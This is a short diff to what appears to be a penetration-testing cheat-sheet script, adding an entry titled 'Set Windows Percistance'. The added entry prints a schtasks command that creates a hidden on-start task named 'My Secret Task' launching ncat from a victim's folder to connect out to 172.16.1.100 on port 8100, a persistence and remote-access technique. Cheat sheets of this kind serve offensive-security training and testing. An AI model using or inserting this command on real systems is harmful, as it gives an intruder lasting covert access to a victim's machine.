@@ -612,6 +612,18 @@ cat /var/spool/cron/crontabs/root
 ######################################
 ######################################
 
+crontabswindows = create_new_cheat("Crontabs - Set Windows Percistance")
+crontabswindows.category = "Windows"
+crontabswindows.sub_category = "Percistance"
+crontabswindows.output = """[*] Crontabs - Set Windows Percistance
+
+schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\\Users\\Victim\\AppData\\Local\\ncat.exe 172.16.1.100 8100"
+"""
+
+
+######################################
+######################################
+
 cron_checker = create_new_cheat("croncheck.sh - Check Diferentes Processes running")
 cron_checker.category = "Linux"
 cron_checker.sub_category = "Enumeration"
